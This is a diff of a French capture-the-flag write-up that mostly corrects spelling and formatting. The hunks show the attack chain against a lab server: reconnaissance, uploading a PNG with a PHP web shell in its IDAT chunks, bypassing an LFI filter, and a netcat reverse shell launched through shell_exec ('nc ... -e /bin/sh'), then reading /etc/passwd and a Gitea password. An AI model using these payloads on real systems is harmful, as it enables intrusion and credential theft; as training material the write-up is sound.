@@ -25,9 +25,9 @@
 > Les commandes nmap on donc été refaites après la fin du challenge ! 
 
 
-Pour ce challenge, un fichier openvpn nous est donné. 
+Pour ce challenge, un fichier openvpn nous est fourni. 
 
-Une fois connecté nous avons arrivons sur une infrastructure pour laquelle nous n'avons aucune information. 
+Une fois connecté nous arrivons sur une infrastructure pour laquelle nous n'avons pas la moindre information. 
 
 On commence donc par vérifier les paramètres réseau obtenues lors de notre connexion au VPN : 
 
@@ -39,13 +39,7 @@ ip -4 a
        valid_lft forever preferred_lft forever
 ```
 
-Et on scanne directement le réseau afin de découvrir de nouvelles machines via : 
-
-```bash 
-nmap -sn 172.30.0.0/28
-```
-
-Je n'ai pas pensé à récupérer la sortie de la commande, mais celle-ci permettait de récupérer les trois adresses suivantes :
+Et on scanne le réseau afin de découvrir de nouvelles machines via : 
 
 ```bash
 nmap -sn 172.30.0.0/28                                                                                                                                                                           
@@ -97,7 +91,7 @@ Le serveur web que nous cherchons est donc sur à l'adress 172.30.0.2.
 
 Nous lançons une reconnaissance du site web avec blackwidow : 
 
-```bash
+```
 sudo ./blackwidow -u http://172.30.0.2   
 
 
@@ -244,16 +238,17 @@ Ouvrons le site :
 ![](./images/penteeeeest/vue_page_accueil.png)
 
 
-Nous retrouvons sur la page d'accueil notre lien github et l'on apprend qu'il s'agit du code source du site "This website is also host on Github". 
-Nous apprenons que le blogueur s'appelle Michael. Ceci pourrait être utile pour un potentiel identifiant.
+Nous retrouvons sur la page d'accueil notre lien github et on apprend qu'il s'agit du code source du site `"This website is also host on Github".`
+
+Nous apprenons que le blogueur s'appelle Michael. 
+Ceci pourrait être utile pour un potentiel identifiant.
 
 Jetons un coup d'oeil au repo github : 
-
 
 ![](./images/penteeeeest/github_project.png)
 
 
-En analysant les sources de chaques fichiers présents dans ce repository, j'ai pu relever plusieurs éléments intérréssants : 
+En analysant les sources de chaque fichiers présents dans ce repository, j'ai pu relever plusieurs élèments intérréssants : 
 * admin/login.php 
 * admin/png_upload.php
 * blog.php
@@ -379,19 +374,19 @@ else {
 
 ```
 
-Nous ici à faire à un formulaire d'upload qui semble à première vue sécurisé. 
+Nous avons ici à faire à un formulaire d'upload qui semble à première vue sécurisé. 
 Le contrôle de l'extension et du type MIME est réalisé, nous pourrions penser que celui-ci n'est pas intéréssant. 
 
-Cependant je décide de vérifier s'il existe une faille sur une des fonctions utilisées. 
+Cependant, je décide de vérifier s'il existe une faille sur une des fonctions utilisées. 
 
 Et là, c'est le jackpot, je tombe sur cette faille très intéréssante que je ne connaissais pas : https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
 
 > Si vous encodez soigneusement un shell web dans une image, vous pouvez contourner les filtres côté serveur et faire en sorte que les shells se matérialisent de nulle part (et je ne parle pas d'encoder des données dans des commentaires ou des métadonnées) - ce post vous montrera comment il est possible d'écrire des shells PHP dans des morceaux PNG IDAT en utilisant uniquement GD.
 
 
-L'article parlant d'utiliser une LFI, je me suis rappellé du paremètre GET "article" précédemment trouvé grace à blackwidow.
+L'article parlant d'utiliser une LFI, je me suis rappellé du paramètre GET "article" précédemment trouvé grâce à blackwidow.
 
-Ce paramètre est traité par la page php blog.php qui possède le code suivant :
+Ce paramètre est traité par la page php blog.php :
 
 ```php
 
@@ -417,7 +412,9 @@ Ce paramètre est traité par la page php blog.php qui possède le code suivant 
 ?>
 ```
 
-Nous avons bien une inclusion de fichier, nous avons toutes les cartes en main pour notre exploitation.
+Nous avons bien une inclusion de fichier. 
+
+Nous avons toutes les cartes en main pour notre exploitation.
 
 
 ### Exploitation
@@ -457,11 +454,9 @@ Nous avons maintenant accès au formulaire d'upload :
 
 Concernant le png à déposer, il suffisait de récupérer le payload mis à dispostion sur l'article : https://www.idontplaydarts.com/images/phppng.png
 
-Celle-ci est également disponible dans ce repository : 
+Celui-ci est également disponible dans ce repository : [payload](files/penteeeeest/blog_payload.html.png)
 
-![payload](files/penteeeeest/blog_payload.html.png)
-
-Nous envoyons le formulaire et nous obtenons le message "success: Image uploaded successfully."
+Nous envoyons le formulaire et nous obtenons le message `"success: Image uploaded successfully."`
 
 Nous savons grâce au code source, et au scan, que les images sont envoyés dans : 
 
@@ -473,13 +468,13 @@ Nous vérifions que celui-ci est bien à l'adresse prévue : http://172.30.0.2/b
 
 C'était bien le cas.
 
-Il ne nous reste donc plus qu'à effectuer notre LFI :  http://172.30.0.2/blog/uploads/payload.png
+Il ne nous reste donc plus qu'à effectuer notre `LFI` :  http://172.30.0.2/blog/uploads/payload.png
 
-Et là c'est le drame nous avons le message d'erreur : "Invalid Format"
+Et là, c'est le drame, nous avons le message d'erreur : "Invalid Format"
 
 Pourquoi ? 
 
-Tout simplement qu'il y'avait un peu de filtrage ! 
+Tout simplement qu'il y'avait un peu de `filtrage` ! 
 
 Le premier consistant à supprimer l'appel relatif : 
 
@@ -495,13 +490,11 @@ if (strpos($file, 'blog_') !== false && strpos($file, 'html') !== false) {
 		}
 ```
 
-Pour le premier nous allons modifier notre manière d"accéder au fichier ""./" par "..//" qui sera transformé par la fonction str_replace en "./" ce qui nous permettra d'effectuer l'inclusion comme voulu.
+Pour le premier, nous allons modifier le début du chemin "./" par "..//" qui sera transformé par la fonction str_replace en "./" ce qui nous permettra d'effectuer l'inclusion comme voulu.
 
-Pour le second et le troisième nous allons modifier le nom de fichier comme ceci : blog_payload.html.png
+Pour le second, et le troisième, nous allons modifier le nom de fichier comme ceci : blog_payload.html.png
 
-Notre LFI devrait donc être : 
-
-..//uploads/blog_payload.html.png
+Notre LFI devrait donc être : `..//uploads/blog_payload.html.png`
 
 Nous transférons notre fichier et tentons l'inclusion : http://172.30.0.2/blog.php?article=..//uploads/blog_payload.html.png 
 
@@ -537,7 +530,7 @@ F�(�`��Q0
 
 Notre commande passe. 
 
-Nous allons chercher à savoir si netcat est installé afin d'obtenir un reverse shell : 
+Nous allons chercher à savoir si `[netcat](https://fr.wikipedia.org/wiki/Netcat)` est installé afin d'obtenir un reverse shell : 
 
 
 ```bash
@@ -556,13 +549,13 @@ F�(�`��Q0
     IEND�B`�<center><a href="https://github.com/Michael-SharkyMaster/website">This website is also host on Github</a></center>
 ```
 
-Il l'est, nous pouvons donc lancer en local un netcat en éocute : 
+Il l'est, nous pouvons donc lancer localement netcat en écoute : 
 
 ```bash
 nc -lvp 1337
 ```
 
-Et demander au serveur cible d'utiliser pour se connecter sur le port que nous veons de mettre en écoute : 
+Puis demander au serveur cible d'utiliser netcat pour se connecter sur le port que nous venons de mettre en écoute : 
 
 ```bash
 wget "http://172.30.0.2/blog.php?article=..//uploads/blog_payload.html.png&0=shell_exec"  --post-data "1=nc 172.30.0.14 1337 -e /bin/sh"
@@ -581,7 +574,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
  
-Nous sommes avec l'utilisateur www-data et nous allons donc devoir chercher un utilisateur sur lequel pivoter :
+Nous sommes connecté avec l'utilisateur www-data et nous allons donc devoir chercher un utilisateur sur lequel pivoter :
  
 ```bash
 cat /etc/passwd
@@ -689,7 +682,7 @@ PATH     = /var/lib/gitea/data/gitea.db
 
 On trouve un mot de passe, on espère qu'il s'agira du même pour l'utilisateur git. 
 
-On vérifie cela en se connectant : 
+On vérifie cela en se connectant via SSH : 
 
 ```bash
 ssh git@172.30.0.2
